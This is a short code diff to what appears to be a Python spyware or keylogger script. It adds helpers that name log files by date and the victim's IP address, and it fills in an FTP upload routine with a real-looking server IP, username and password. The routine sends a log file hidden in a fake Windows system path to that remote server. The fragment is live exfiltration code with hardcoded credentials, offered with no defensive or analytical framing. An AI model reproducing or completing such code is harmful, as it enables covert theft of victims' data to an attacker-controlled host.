@@ -10,7 +10,7 @@ def getSystemIP():
 
 def getDate():
     i=datetime.datetime.now()
-    return str(i.day)+"."+str(i.month)+"."+str(i.year)
+    return str(i.day)+"D"+str(i.month)+"M"+str(i.year)+"Y"
 
 def getName():
     FName=getDate()+"@"+getSystemIP()+".txt"
@@ -19,9 +19,9 @@ def getName():
 def ftp():
     log_name= r"C:\Windows Files\system 32\drivers\etc\files\host\log.ob"
     try:
-        SERVER="address" #Specify your FTP Server address
-        USERNAME="Username" #Specify your FTP Username
-        PASSWORD="Password" #Specify your FTP Password
+        SERVER="31.170.162.223" #Specify your FTP Server address
+        USERNAME="a1659661" #Specify your FTP Username
+        PASSWORD="urotropine314" #Specify your FTP Password
         SSL=0 #Set 1 for SSL and 0 for normal connection
         OUTPUT_DIR="/" #Specify output directory here
         if SSL==0:
